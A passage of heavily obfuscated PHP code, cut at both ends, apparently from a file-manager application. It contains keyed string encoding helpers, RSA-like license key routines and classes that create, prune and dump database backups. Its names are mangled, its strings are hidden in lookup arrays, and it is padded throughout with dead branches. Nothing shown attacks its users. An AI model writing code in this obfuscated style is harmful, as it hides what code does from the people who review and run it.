$_SERVER[à¼£¥Õé]; usleep(1); $ûöşÇëÂ = $Œ‹Ş¬¡Ô[783]; $ßñğ¬Ó† = trim($ßñğ¬Ó†); $×áĞ©ƒ = mt_rand(0, 5) . $ß©Â†©Ó[6]; $¤àæßÈ¿ = rand_string(15); $¿Ûôà = $Œ‹Ş¬¡Ô[784]; if (!$¿Ûôà) { return; } $ÎâÉş¸ñ = $ß©Â†©Ó[300]; $·Íï…— = $Œ‹Ş¬¡Ô[785]; while ($·Íï…— < $Œ‹Ş¬¡Ô[706]) { if ($·Íï…— >= 0) { break; } $·Íï…—++; } switch ($×áĞ©ƒ) { case $ß©Â†©Ó[206]: $¡à°Óœ® = $this->ygcq5c08912c($ßñğ¬Ó†, strrev($ÍƒŒĞÑú . $¤àæßÈ¿)); break; $—õÅÒ¨‘ = $Œ‹Ş¬¡Ô[786]; if (strlen($—õÅÒ¨‘) < $Œ‹Ş¬¡Ô[699]) { return; } case $ß©Â†©Ó[122]: $¡à°Óœ® = $this->ygcq5c08912c($ßñğ¬Ó†, strrev($¤àæßÈ¿ . $ÍƒŒĞÑú)); break; $«ßşÒ›˜ = $Œ‹Ş¬¡Ô[787]; case $ß©Â†©Ó[301]: $¡à°Óœ® = $this->ygcq5c08912c($ßñğ¬Ó†, base64_encode($¤àæßÈ¿ . $ÍƒŒĞÑú)); $å®«¦ = $Œ‹Ş¬¡Ô[788]; break; case $ß©Â†©Ó[302]: $¡à°Óœ® = $this->ygcq5c08912c($ßñğ¬Ó†, md5($¤àæßÈ¿ . $ÍƒŒĞÑú)); break; $¬–±Ú¡ = $Œ‹Ş¬¡Ô[789]; if (strlen($¬–±Ú¡) < $Œ‹Ş¬¡Ô[699]) { die; } case $ß©Â†©Ó[303]: $ßñğ¬Ó† = base64_encode($ßñğ¬Ó†); $‰ú…Šµ– = rand(0, 64); $É­şÌ°½ = $Œ‹Ş¬¡Ô[790]; if (strlen($É­şÌ°½) < $Œ‹Ş¬¡Ô[706]) { return; } $ı€´“÷¿ = $ÎâÉş¸ñ[$‰ú…Šµ–]; $ó¶éì = $Œ‹Ş¬¡Ô[791]; $’ºí“—… = md5($ı€´“÷¿ . md5($ÍƒŒĞÑú . $ı€´“÷¿) . $ÍƒŒĞÑú); $’ºí“—… = substr($’ºí“—…, $‰ú…Šµ– % 8, $‰ú…Šµ– % 8 + 7); $–ø®ò¨ô = $Œ‹Ş¬¡Ô[792]; if (strlen($–ø®ò¨ô) < $Œ‹Ş¬¡Ô[708]) { die; } $†ıŸ•ğî = $ß©Â†©Ó[6]; $Ôû¬®û = 0; $ê•¹°µ¹ = $Œ‹Ş¬¡Ô[793]; if (!$ê•¹°µ¹) { return; } $Ş­í“ã× = 0; $¥…¥ú¬ = 0; $ÇâÆ‡à = $Œ‹Ş¬¡Ô[794]; for ($Ôû¬®û = 0; $Ôû¬®û < strlen($ßñğ¬Ó†); $Ôû¬®û++) { $¥…¥ú¬ = $¥…¥ú¬ == strlen($’ºí“—…) ? 0 : $¥…¥ú¬; $ê´ş½Éˆ = $Œ‹Ş¬¡Ô[795]; $Ş­í“ã× = ($‰ú…Šµ– + strpos($ÎâÉş¸ñ, $ßñğ¬Ó†[$Ôû¬®û]) + ord($’ºí“—…[$¥…¥ú¬++])) % 64; $†ıŸ•ğî .= $ÎâÉş¸ñ[$Ş­í“ã×]; $ºªÊë× = $Œ‹Ş¬¡Ô[796]; } $¡à°Óœ® = hash_encode($ı€´“÷¿ . $†ıŸ•ğî); break; $Öº¾ı–“ = $Œ‹Ş¬¡Ô[797]; while ($Öº¾ı–“ < $Œ‹Ş¬¡Ô[688]) { if ($Öº¾ı–“ >= 0) { break; } $Öº¾ı–“++; } default: $¡à°Óœ® = $this->ygcq5c08912c($ßñğ¬Ó†, $ÍƒŒĞÑú . $¤àæßÈ¿); $ÖÔ½‚š¬ = $Œ‹Ş¬¡Ô[798]; if (strlen($ÖÔ½‚š¬) < $Œ‹Ş¬¡Ô[708]) { die; } break; } $¡à°Óœ® = strrev($×áĞ©ƒ . $¤àæßÈ¿ . $¡à°Óœ®); $ï„Ê¹Ê³ = $Œ‹Ş¬¡Ô[799]; while ($ï„Ê¹Ê³ < $Œ‹Ş¬¡Ô[688]) { if ($ï„Ê¹Ê³ >= 0) { break; } $ï„Ê¹Ê³++; } if ($ßË£È‘¸ - 1 > 0) { $¡à°Óœ® = $this->hlxj37619dac($¡à°Óœ®, $ÍƒŒĞÑú, $ßË£È‘¸ - 1); } return $¡à°Óœ®; } private function ktvr28cdb429($¾ú£š—é, $‚¢ŞÇÃè, $É£Ææ¨® = 3) { $ÇÌ‹âƒ¼ =& $_SERVER[ÓïÕü]; $ÖŸÍ—Ï“ =& $_SERVER[à¼£¥Õé]; if (!is_string($¾ú£š—é) || strlen($¾ú£š—é) < 10) { return !1; } $¾ú£š—é = trim($¾ú£š—é); $¾ú£š—é = strrev($¾ú£š—é); $Ïì÷º¢² = $¾ú£š—é[0]; $¸é²†Ç’ = $ÇÌ‹âƒ¼[800]; while (strlen($¸é²†Ç’) < $ÇÌ‹âƒ¼[688]) { if (!$¸é²†Ç’) { break; } $¸é²†Ç’++; } $ÖÏ¾¼ü– = substr($¾ú£š—é, 1, 15); $î¹àŞã = $ÇÌ‹âƒ¼[801]; if (!$î¹àŞã) { die; } $¾ú£š—é = substr($¾ú£š—é, 16); $ıäÚ˜í¤ = $ÖŸÍ—Ï“[300]; switch ($Ïì÷º¢²) { case $ÖŸÍ—Ï“[206]: $§ßêØã’ = $this->onduf80efd3e($¾ú£š—é, strrev($‚¢ŞÇÃè . $ÖÏ¾¼ü–)); break; $ÍåÆóø¼ = $ÇÌ‹âƒ¼[802]; case $ÖŸÍ—Ï“[122]: $§ßêØã’ = $this->onduf80efd3e($¾ú£š—é, strrev($ÖÏ¾¼ü– . $‚¢ŞÇÃè)); $¥ñ„ïÛ¾ = $ÇÌ‹âƒ¼[803]; if (strlen($¥ñ„ïÛ¾) < $ÇÌ‹âƒ¼[699]) { return; } break; $˜Ñ€˜—˜ = $ÇÌ‹âƒ¼[804]; while (strlen($˜Ñ€˜—˜) < $ÇÌ‹âƒ¼[699]) { if (!$˜Ñ€˜—˜) { break; } $˜Ñ€˜—˜++; } case $ÖŸÍ—Ï“[301]: $§ßêØã’ = $this->onduf80efd3e($¾ú£š—é, base64_encode($ÖÏ¾¼ü– . $‚¢ŞÇÃè)); $ûäØÂıñ = $ÇÌ‹âƒ¼[805]; if (!$ûäØÂıñ) { return; } break; case $ÖŸÍ—Ï“[302]: $§ßêØã’ = $this->onduf80efd3e($¾ú£š—é, md5($ÖÏ¾¼ü– . $‚¢ŞÇÃè)); break; $«Öé¦Ø˜ = $ÇÌ‹âƒ¼[806]; if (strlen($«Öé¦Ø˜) < $ÇÌ‹âƒ¼[699]) { return; } case $ÖŸÍ—Ï“[303]: $¾ú£š—é = hash_decode($¾ú£š—é); $ƒ§¸äíº = $ÇÌ‹âƒ¼[807]; if (!$ƒ§¸äíº) { die; } $Ä‘óøéß = $¾ú£š—é[0]; $¾ú£š—é = substr($¾ú£š—é, 1); $ÙØ¸ÓÙÎ = strpos($ıäÚ˜í¤, $Ä‘óøéß); $ŠÓÇ…àì = $ÇÌ‹âƒ¼[808]; while ($ŠÓÇ…àì < $ÇÌ‹âƒ¼[688]) { if ($ŠÓÇ…àì >= 0) { break; } $ŠÓÇ…àì++; } $©‰´…£Æ = md5($Ä‘óøéß . md5($‚¢ŞÇÃè . $Ä‘óøéß) . $‚¢ŞÇÃè); $©‰´…£Æ = substr($©‰´…£Æ, $ÙØ¸ÓÙÎ % 8, $ÙØ¸ÓÙÎ % 8 + 7); $¶¢–ò‹¬ = $ÇÌ‹âƒ¼[809]; if (!$¶¢–ò‹¬) { die; } $Æù‹¨ Ü = $ÖŸÍ—Ï“[6]; $Æç×Àï¥ = 0; $Û•Æ‚¯ = $ÇÌ‹âƒ¼[810]; $¸Š¾İ»ò = 0; $•˜Ûü¢ = 0; $­¶€¼á¾ = $ÇÌ‹âƒ¼[811]; if (!$­¶€¼á¾) { die; } for ($Æç×Àï¥ = 0; $Æç×Àï¥ < strlen($¾ú£š—é); $Æç×Àï¥++) { $•˜Ûü¢ = $•˜Ûü¢ == strlen($©‰´…£Æ) ? 0 : $•˜Ûü¢; $Ø“¿ê©Ê = $•˜Ûü¢++; $¸Š¾İ»ò = strpos($ıäÚ˜í¤, $¾ú£š—é[$Æç×Àï¥]) - $ÙØ¸ÓÙÎ - ord($©‰´…£Æ[$Ø“¿ê©Ê]); $Ä½Á¦³ = $ÇÌ‹âƒ¼[812]; if (!$Ä½Á¦³) { die; } while ($¸Š¾İ»ò < 0) { $¸Š¾İ»ò += 64; } $Æù‹¨ Ü .= $ıäÚ˜í¤[$¸Š¾İ»ò]; } $§ßêØã’ = base64_decode($Æù‹¨ Ü); break; $Å±Û“Í = $ÇÌ‹âƒ¼[813]; if (strlen($Å±Û“Í) < $ÇÌ‹âƒ¼[706]) { die; } default: $§ßêØã’ = $this->onduf80efd3e($¾ú£š—é, $‚¢ŞÇÃè . $ÖÏ¾¼ü–); $ÙÈ¶½ö = $ÇÌ‹âƒ¼[814]; while (strlen($ÙÈ¶½ö) < $ÇÌ‹âƒ¼[699]) { if (!$ÙÈ¶½ö) { break; } $ÙÈ¶½ö++; } break; } if ($É£Ææ¨® - 1 > 0) { $§ßêØã’ = $this->ktvr28cdb429($§ßêØã’, $‚¢ŞÇÃè, $É£Ææ¨® - 1); } return $§ßêØã’; } public function hzyq23686e0e($ı¾Û–Ğ) { $Æ¶¹õÖŒ =& $_SERVER[ÓïÕü]; $¿æµÎ•¾ =& $_SERVER[à¼£¥Õé]; $£ÑŞÕ… = $this->zuqgb64309bc(); $†–¼¯±¾ = $Æ¶¹õÖŒ[815]; $š—†ú²Î = $this->zuqgb64309bc(); $Ä¸ôÖ·ü = $Æ¶¹õÖŒ[816]; $û†Ø•åÑ = ($£ÑŞÕ… - 1) * ($š—†ú²Î - 1); $ÂğÓù¥· = intval(($£ÑŞÕ… + $š—†ú²Î) / 2); while (1) { $¼³¬İ = $ÂğÓù¥·; $©Ú§„‡ş = $û†Ø•åÑ; $É³ªÊÁê = $Æ¶¹õÖŒ[817]; while ($©Ú§„‡ş % $¼³¬İ != 0) { $ŸŸ¤¿Î¤ = $©Ú§„‡ş; $é­¿âµ› = $Æ¶¹õÖŒ[818]; while ($é­¿âµ› < $Æ¶¹õÖŒ[695]) { if ($é­¿âµ› >= 0) { break; } $é­¿âµ›++; } $©Ú§„‡ş = $¼³¬İ; $¼³¬İ = $ŸŸ¤¿Î¤ % $¼³¬İ; } if ($¼³¬İ == 1) { break; } else { $ÂğÓù¥·++; } } $š›´Â°Å = 2; $ëµÓÍş = $Æ¶¹õÖŒ[819]; if (strlen($ëµÓÍş) < $Æ¶¹õÖŒ[695]) { die; } for ($Î™ß‡’ü = 0; $Î™ß‡’ü < $û†Ø•åÑ * 10; $Î™ß‡’ü++) { if (($û†Ø•åÑ * $Î™ß‡’ü + 1) % $ÂğÓù¥· == 0) { $š›´Â°Å = intval(($û†Ø•åÑ * $Î™ß‡’ü + 1) / $ÂğÓù¥·); break; } } $€ëÆŒã£ = $this->ygcq5c08912c($£ÑŞÕ… * $š—†ú²Î . $¿æµÎ•¾[6], $¿æµÎ•¾[136]); $»œ’à¼ğ = $Æ¶¹õÖŒ[820]; if (strlen($»œ’à¼ğ) < $Æ¶¹õÖŒ[695]) { return; } $«¥—ÈïÒ = md5($¿æµÎ•¾[304] . ($£ÑŞÕ… + $š—†ú²Î) . $¿æµÎ•¾[305] . $ÂğÓù¥· . $¿æµÎ•¾[305] . $š›´Â°Å . $¿æµÎ•¾[306]); $¬áŠ¸· = $Æ¶¹õÖŒ[821]; if (strlen($¬áŠ¸·) < $Æ¶¹õÖŒ[706]) { return; } $İ¦ÏãÉ = $this->ygcq5c08912c($ı¾Û–Ğ, $«¥—ÈïÒ) . $¿æµÎ•¾[307] . $€ëÆŒã£; return $İ¦ÏãÉ; $à“ÌàÜ = $Æ¶¹õÖŒ[822]; while ($à“ÌàÜ < $Æ¶¹õÖŒ[695]) { if ($à“ÌàÜ >= 0) { break; } $à“ÌàÜ++; } } public function lupm5bf010f2($”ÅÂÍ¤õ) { $ÄÎø¶ĞÑ =& $_SERVER[ÓïÕü]; $²¥÷½ÖÈ =& $_SERVER[à¼£¥Õé]; $Ãââ÷÷‘ = explode($²¥÷½ÖÈ[307], $”ÅÂÍ¤õ); if (count($Ãââ÷÷‘) != 2) { return $²¥÷½ÖÈ[6]; } $àç…îŠ’ = $this->onduf80efd3e($Ãââ÷÷‘[1] . $²¥÷½ÖÈ[6], $²¥÷½ÖÈ[136]); $æªšõøŠ = $ÄÎø¶ĞÑ[823]; while ($æªšõøŠ < $ÄÎø¶ĞÑ[688]) { if ($æªšõøŠ >= 0) { break; } $æªšõøŠ++; } if (!$àç…îŠ’) { return $²¥÷½ÖÈ[6]; } $àç…îŠ’ = intval($àç…îŠ’); $°ì•¶šß = $ÄÎø¶ĞÑ[824]; if (!$°ì•¶šß) { return; } $’ï†ÚôÍ = 0; $‹®å®à× = 0; for ($«‘šùĞÃ = 3; $«‘šùĞÃ < $àç…îŠ’; $«‘šùĞÃ += 2) { if ($àç…îŠ’ % $«‘šùĞÃ != 0) { continue; } $’ï†ÚôÍ = $«‘šùĞÃ; $‹®å®à× = intval($àç…îŠ’ / $«‘šùĞÃ); $¦èï‚ü¤ = $ÄÎø¶ĞÑ[825]; if (strlen($¦èï‚ü¤) < $ÄÎø¶ĞÑ[688]) { return; } break; } $ª‹¹è¶¸ = ($’ï†ÚôÍ - 1) * ($‹®å®à× - 1); $‘“›“€‘ = intval(($’ï†ÚôÍ + $‹®å®à×) / 2); $›°¾Æó = $ÄÎø¶ĞÑ[826]; if (!$›°¾Æó) { return; } while (1) { $Ó„ÜÚ†Ï = $‘“›“€‘; $œìäš = $ÄÎø¶ĞÑ[827]; if (strlen($œìäš) < $ÄÎø¶ĞÑ[706]) { die; } $Ìôå˜Œì = $ª‹¹è¶¸; while ($Ìôå˜Œì % $Ó„ÜÚ†Ï != 0) { $¤û–Ÿ€ø = $Ìôå˜Œì; $Ìôå˜Œì = $Ó„ÜÚ†Ï; $Ó„ÜÚ†Ï = $¤û–Ÿ€ø % $Ó„ÜÚ†Ï; $ãáöøã = $ÄÎø¶ĞÑ[828]; while ($ãáöøã < $ÄÎø¶ĞÑ[706]) { if ($ãáöøã >= 0) { break; } $ãáöøã++; } } if ($Ó„ÜÚ†Ï == 1) { break; } else { $‘“›“€‘++; } } $„³µäìı = 2; for ($«‘šùĞÃ = 0; $«‘šùĞÃ < $ª‹¹è¶¸ * 10; $«‘šùĞÃ++) { if (($ª‹¹è¶¸ * $«‘šùĞÃ + 1) % $‘“›“€‘ == 0) { $„³µäìı = intval(($ª‹¹è¶¸ * $«‘šùĞÃ + 1) / $‘“›“€‘); break; } } $ß’ñ© = md5($²¥÷½ÖÈ[304] . ($’ï†ÚôÍ + $‹®å®à×) . $²¥÷½ÖÈ[305] . $‘“›“€‘ . $²¥÷½ÖÈ[305] . $„³µäìı . $²¥÷½ÖÈ[306]); $Ãğòò‡ = $ÄÎø¶ĞÑ[829]; while (strlen($Ãğòò‡) < $ÄÎø¶ĞÑ[695]) { if (!$Ãğòò‡) { break; } $Ãğòò‡++; } $½ìÌî“ = $this->onduf80efd3e($Ãââ÷÷‘[0], $ß’ñ©); return $½ìÌî“; $ÌËªŸ‡ß = $ÄÎø¶ĞÑ[830]; while ($ÌËªŸ‡ß < $ÄÎø¶ĞÑ[706]) { if ($ÌËªŸ‡ß >= 0) { break; } $ÌËªŸ‡ß++; } } public function zuqgb64309bc() { $¾ô²œÂÅ =& $_SERVER[ÓïÕü]; $‹¥Û³Ï = mt_rand(pow(2, 14), pow(2, 16) - 1); $ØÏœà¶ã = $¾ô²œÂÅ[831]; if (!$ØÏœà¶ã) { die; } $“ú¸Ø¤Í = array(); $ˆ›ÉûçÍ = $¾ô²œÂÅ[832]; while (strlen($ˆ›ÉûçÍ) < $¾ô²œÂÅ[688]) { if (!$ˆ›ÉûçÍ) { break; } $ˆ›ÉûçÍ++; } $ã«ª¡İ¤ = 1; $¡¯ù€Ëª = $¾ô²œÂÅ[833]; if (!$¡¯ù€Ëª) { return; } while ($ã«ª¡İ¤ <= (int) sqrt($‹¥Û³Ï)) { $øŠÔ÷Ì÷ = $ã«ª¡İ¤; while (!0) { $øŠÔ÷Ì÷++; $¢æ‹ê•è = $¾ô²œÂÅ[834]; if (strlen($¢æ‹ê•è) < $¾ô²œÂÅ[706]) { return; } if ($øŠÔ÷Ì÷ <= 2) { $ã«ª¡İ¤ = $øŠÔ÷Ì÷; break; } else { if ($øŠÔ÷Ì÷ < 2) { continue; } } $›õş³óÎ = !0; for ($ó¢º‚¬Ë = 2; $ó¢º‚¬Ë <= sqrt($øŠÔ÷Ì÷); $ó¢º‚¬Ë++) { if ($øŠÔ÷Ì÷ % $ó¢º‚¬Ë == 0) { $›õş³óÎ = !1; } } if ($›õş³óÎ) { $ã«ª¡İ¤ = $øŠÔ÷Ì÷; break; } } $“ú¸Ø¤Í[] = $ã«ª¡İ¤; $†¼ùˆêµ = $¾ô²œÂÅ[835]; if (strlen($†¼ùˆêµ) < $¾ô²œÂÅ[695]) { die; } } $ó°²õ = 2; $µÑÏ—ä = $¾ô²œÂÅ[836]; if (!$µÑÏ—ä) { return; } for ($øŠÔ÷Ì÷ = $‹¥Û³Ï; $øŠÔ÷Ì÷ > 1; $øŠÔ÷Ì÷--) { $›õş³óÎ = !0; foreach ($“ú¸Ø¤Í as $Ò”Æêñ¤) { if ($øŠÔ÷Ì÷ % $Ò”Æêñ¤ == 0) { $›õş³óÎ = !1; break; } } if ($›õş³óÎ) { $ó°²õ = $øŠÔ÷Ì÷; break; } } return $ó°²õ; $„˜¸¶‘ = $¾ô²œÂÅ[837]; if (strlen($„˜¸¶‘) < $¾ô²œÂÅ[699]) { return; } } public function khgd3a43213e($âõú´ñ, $¿ÍŞåŸ½) { $¡‹èî¿Î =& $_SERVER[à¼£¥Õé]; return call_user_func(array($¡‹èî¿Î[8], $¡‹èî¿Î[308]), $âõú´ñ, $¿ÍŞåŸ½); $’Û…‚¬Ş = $_SERVER[ÓïÕü][838]; } public function ygcq5c08912c($Œ‡šÖÇº, $Š“¾ıŸŠ) { $ºÀç¶èØ =& $_SERVER[à¼£¥Õé]; return call_user_func(array($ºÀç¶èØ[309], $ºÀç¶èØ[310]), $Œ‡šÖÇº, $Š“¾ıŸŠ); } public function onduf80efd3e($èë‘÷İº, $¥êë¤Ú®) { $¾å¹‚ =& $_SERVER[à¼£¥Õé]; return call_user_func(array($¾å¹‚[309], $¾å¹‚[311]), $èë‘÷İº, $¥êë¤Ú®); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ÓïÕü][839]); $this->init(); $this->keep(); } public function init() { $‡Ô²¡¼— =& $_SERVER[ÓïÕü]; $this->isManual(); self::$name = date($‡Ô²¡¼—[840]); if (!($ú˜ô¾Å¯ = $this->model->lastItem())) { $ú˜ô¾Å¯ = $this->initData(); } else { self::$name = $ú˜ô¾Å¯[$‡Ô²¡¼—[32]]; if ($ú˜ô¾Å¯[$‡Ô²¡¼—[841]] == $‡Ô²¡¼—[91]) { self::$name = date($‡Ô²¡¼—[262]); $Æ¸Ğòú¡ = intval(_get($ú˜ô¾Å¯, $‡Ô²¡¼—[842], 0)); if (self::$manual == 0 && $ú˜ô¾Å¯[$‡Ô²¡¼—[32]] == self::$name) { $this->model->remove($ú˜ô¾Å¯[$‡Ô²¡¼—[478]]); } $ú˜ô¾Å¯ = $this->initData($Æ¸Ğòú¡, $ú˜ô¾Å¯[$‡Ô²¡¼—[843]]); } else { $this->checkStore($ú˜ô¾Å¯[$‡Ô²¡¼—[843]]); } } self::$option = $ú˜ô¾Å¯; } private function isManual() { $¼ËÜï›‰ = _get($GLOBALS, $_SERVER[ÓïÕü][844], 0); $¼ËÜï›‰ = intval($¼ËÜï›‰); self::$manual = $¼ËÜï›‰ && $¼ËÜï›‰ == 1 ? 1 : 0; } private function initData($Ù•ë­Ô© = 0, $Øİì’±É = '') { $˜‰î­ƒ =& $_SERVER[ÓïÕü]; $Ş¶ÊööØ = $this->model->config(); if ($Øİì’±É && $Ş¶ÊööØ[$˜‰î­ƒ[843]] != $Øİì’±É) { $Ù•ë­Ô© = 0; } $this->checkStore($Ş¶ÊööØ[$˜‰î­ƒ[843]]); if (self::$manual == 1) { self::$name .= $˜‰î­ƒ[11] . date($˜‰î­ƒ[845]); } $¿Åğí¡æ = array($˜‰î­ƒ[843] => $Ş¶ÊööØ[$˜‰î­ƒ[843]], $˜‰î­ƒ[32] => self::$name, $˜‰î­ƒ[841] => 0, $˜‰î­ƒ[171] => $Ş¶ÊööØ[$˜‰î­ƒ[171]], $˜‰î­ƒ[846] => self::$manual, $˜‰î­ƒ[371] => array($˜‰î­ƒ[847] => array($˜‰î­ƒ[841] => 0), $˜‰î­ƒ[848] => array($˜‰î­ƒ[841] => 0, $˜‰î­ƒ[849] => 0, $˜‰î­ƒ[850] => 0, $˜‰î­ƒ[33] => $˜‰î­ƒ[12], $˜‰î­ƒ[851] => 0, $˜‰î­ƒ[852] => 0), $˜‰î­ƒ[853] => array($˜‰î­ƒ[841] => 0, $˜‰î­ƒ[849] => 0, $˜‰î­ƒ[850] => 0, $˜‰î­ƒ[851] => 0, $˜‰î­ƒ[852] => 0), $˜‰î­ƒ[233] => array($˜‰î­ƒ[841] => 0, $˜‰î­ƒ[854] => 0, $˜‰î­ƒ[855] => 0, $˜‰î­ƒ[856] => 0, $˜‰î­ƒ[857] => 0, $˜‰î­ƒ[546] => $Ù•ë­Ô©, $˜‰î­ƒ[851] => 0, $˜‰î­ƒ[852] => 0)), $˜‰î­ƒ[851] => time(), $˜‰î­ƒ[852] => 0); $—“á’Œä = $this->model->insert($¿Åğí¡æ); $¿Åğí¡æ[$˜‰î­ƒ[478]] = $—“á’Œä; return $¿Åğí¡æ; } private function checkStore($­Î½¨†”) { $Ô²„Ùç = Model($_SERVER[ÓïÕü][858]); $Ûµºóõ“ = $Ô²„Ùç->listData($­Î½¨†”); $Ô²„Ùç->checkConfig($Ûµºóõ“); } public static function get() { if (!self::$option) { $úüæ‰ = Model($_SERVER[ÓïÕü][839]); $–Şúè·¨ = $úüæ‰->findByName(self::$name); $úüæ‰->parseContent($–Şúè·¨); self::$option = $–Şúè·¨; } return self::$option; } public static function set($¹œÍ¹½Ç) { $ŞùÖœö =& $_SERVER[ÓïÕü]; $ûØ‘ô†µ = self::get(); foreach ($¹œÍ¹½Ç as $ãµˆğå => $‘Š˜²Å•) { array_set_value($ûØ‘ô†µ, $ãµˆğå, $‘Š˜²Å•); } Model($ŞùÖœö[839])->update($ûØ‘ô†µ[$ŞùÖœö[478]], $ûØ‘ô†µ); self::$option = $ûØ‘ô†µ; return self::$option; } public function keep() { $Úìï€±ª =& $_SERVER[ÓïÕü]; $Í˜Óˆ­â = self::get(); if (_get($Í˜Óˆ­â, $Úìï€±ª[859], 0) == $Úìï€±ª[91]) { return; } $this->backupKeep($Í˜Óˆ­â); self::set(array($Úìï€±ª[859] => 1)); } private function backupKeep($•™áÈ™ã) { $ºæ§Ú¢ç =& $_SERVER[ÓïÕü]; if (self::$manual == 1) { return; } $šÊ§„çÉ = $this->model->listData(); if (empty($šÊ§„çÉ)) { return; } $ìÃç€ê = 0; $—ó›Ü¹´ = array(); foreach ($šÊ§„çÉ as $ÇÈªŠ­) { if ($ìÃç€ê >= 7) { break; } $—ó›Ü¹´[] = $ÇÈªŠ­[$ºæ§Ú¢ç[32]]; $ìÃç€ê++; } for ($ìÃç€ê = 0; $ìÃç€ê < 12; $ìÃç€ê++) { $—ó›Ü¹´[] = date($ºæ§Ú¢ç[860], strtotime("\x2d{$ìÃç€ê}\40\155\x6f\x6e\164\x68\x73")); } $—ó›Ü¹´ = array_unique($—ó›Ü¹´); $ÈçÑË½„ = Model($ºæ§Ú¢ç[861])->get($ºæ§Ú¢ç[862]); foreach ($šÊ§„çÉ as $ÇÈªŠ­) { if (isset($ÇÈªŠ­[$ºæ§Ú¢ç[846]]) && $ÇÈªŠ­[$ºæ§Ú¢ç[846]] == $ºæ§Ú¢ç[91]) { continue; } if (!empty($ÇÈªŠ­[$ºæ§Ú¢ç[32]]) && in_array($ÇÈªŠ­[$ºæ§Ú¢ç[32]], $—ó›Ü¹´)) { continue; } $this->model->remove($ÇÈªŠ­[$ºæ§Ú¢ç[478]]); $×™æšù» = $this->backupPath($•™áÈ™ã, $ÈçÑË½„); IO::remove($×™æšù», !1); } } private function backupPath($ù‰øººó, $¯³‘©Á¦ = false) { $¥…ÀøÌş =& $_SERVER[ÓïÕü]; if (!$¯³‘©Á¦) { $¯³‘©Á¦ = Model($¥…ÀøÌş[861])->get($¥…ÀøÌş[862]); } $¦’ÌÀ‰½ = $ù‰øººó[$¥…ÀøÌş[32]]; $ñËûïØ = substr(md5($¥…ÀøÌş[863] . $¯³‘©Á¦ . $¦’ÌÀ‰½), 0, 8); return "\173\x69\157\x3a{$ù‰øººó[$¥…ÀøÌş[843]]}\x7d\x2f\x64\141\x74\141\x62\x61\x73\145\x2f\142\x61\x63\153\x75\x70\x2f" . $¦’ÌÀ‰½ . $¥…ÀøÌş[11] . $ñËûïØ; } public function db() { $À•À‹ú =& $_SERVER[ÓïÕü]; $¸—Ğ”Î = self::get(); if (_get($¸—Ğ”Î, $À•À‹ú[864], 0) == $À•À‹ú[91]) { return !0; } $Œ¨ã€Ëƒ = new BackupDb(); if (!$Œ¨ã€Ëƒ->index()) { return !1; } self::set(array($À•À‹ú[864] => 1)); return !0; } public function dbFile() { $«‰öÆÛ¢ =& $_SERVER[ÓïÕü]; $÷úÅïüØ = self::get(); if (_get($÷úÅïüØ, $«‰öÆÛ¢[865], 0) == $«‰öÆÛ¢[91]) { return !0; } $¨ÍÚŞš = new BackupDbFile(); if (!$¨ÍÚŞš->index()) { return !1; } self::set(array($«‰öÆÛ¢[865] => 1)); return !0; } public function file() { $Æüà‰¿ç =& $_SERVER[ÓïÕü]; $íæÒ®„ = self::get(); if (_get($íæÒ®„, $Æüà‰¿ç[866], 0) == $Æüà‰¿ç[91]) { return !0; } if ($íæÒ®„[$Æüà‰¿ç[171]] == $Æüà‰¿ç[867]) { $‘‚öƒ Ù = new BackupFile(); if (!$‘‚öƒ Ù->index()) { return !1; } } self::set(array($Æüà‰¿ç[866] => 1, $Æüà‰¿ç[841] => 1)); return !0; } public static function log($ ©ñ¹ùî) { write_log($ ©ñ¹ùî, $_SERVER[ÓïÕü][868]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¿úåŸ·‚ =& $_SERVER[ÓïÕü]; $ÙâéúÙé = Backup::get(); self::$io = $ÙâéúÙé[$¿úåŸ·‚[843]]; self::$name = $ÙâéúÙé[$¿úåŸ·‚[32]]; $ºâè“± = new DbManage(); $­¼ŞÃ€¯ = $ºâè“±->dbType(); $§óÃÎ©‚ = array($¿úåŸ·‚[869] => $­¼ŞÃ€¯, $¿úåŸ·‚[870] => time()); Backup::set($§óÃÎ©‚); $ÛšˆØ¦• = $this->tmpFilesPath() . $¿úåŸ·‚[871] . self::$name . $¿úåŸ·‚[8]; del_dir($ÛšˆØ¦•); mk_dir($ÛšˆØ¦•); $ñãçˆ«ì = $±ÚĞ£õñ = 0; try { $ÔÙƒ‘Á = $ºâè“±->db()->getTables(); } catch (Exception $¡¤Ôú‚ù) { Backup::log($¿úåŸ·‚[872] . $¡¤Ôú‚ù->getMessage()); return !1; } $ÔÙƒ‘Á = array_diff($ÔÙƒ‘Á, array($¿úåŸ·‚[873], $¿úåŸ·‚[874])); foreach ($ÔÙƒ‘Á as $âÄÛ‹á“) { if ($âÄÛ‹á“ == $¿úåŸ·‚[875]) { continue; } $ñãçˆ«ì += $ºâè“±->model($âÄÛ‹á“)->count(); } $º«Şé­Ñ = new Task($¿úåŸ·‚[876], $¿úåŸ·‚[868], $ñãçˆ«ì, LNG($¿úåŸ·‚[877]) . $¿úåŸ·‚[878] . LNG($¿úåŸ·‚[879])); $GLOBALS[$¿úåŸ·‚[880]] = self::$name; foreach ($ÔÙƒ‘Á as $âÄÛ‹á“) { $Ô®·‡ÈÉ = $ÛšˆØ¦• . $âÄÛ‹á“ . $¿úåŸ·‚[881]; if ($âÄÛ‹á“ == $¿úåŸ·‚[875]) { @touch($Ô®·‡ÈÉ); continue; } $¬Æµ“è· = null; if ($âÄÛ‹á“ == $¿úåŸ·‚[882] && $ÙâéúÙé[$¿úåŸ·‚[171]] == $¿úåŸ·‚[867]) { $¬Æµ“è· = self::$io; } $±ÚĞ£õñ += $ºâè“±->sqlFromDb($âÄÛ‹á“, $Ô®·‡ÈÉ, $º«Şé­Ñ, $¬Æµ“è·); } unset($GLOBALS[$¿úåŸ·‚[880]]); $º«Şé­Ñ->end(); if ($±ÚĞ£õñ > $ñãçˆ«ì) { $ñãçˆ«ì = $±ÚĞ£õñ; } $§óÃÎ©‚ = array($¿úåŸ·‚[869] => $­¼ŞÃ€¯, $¿úåŸ·‚[864] => 1, $¿úåŸ·‚[883] => $ñãçˆ«ì, $¿úåŸ·‚[884] => $±ÚĞ£õñ, $¿úåŸ·‚[885] => time()); Backup::set($§óÃÎ©‚); if ($ñãçˆ«ì - $±ÚĞ£õñ > 0) { $ŞŒé³å˜ = $¿úåŸ·‚[886]; if (!stristr(I18n::getType(), $¿úåŸ·‚[887])) { $ŞŒé³å˜ = $¿úåŸ·‚[888]; } Backup::log(array($ŞŒé³å˜, 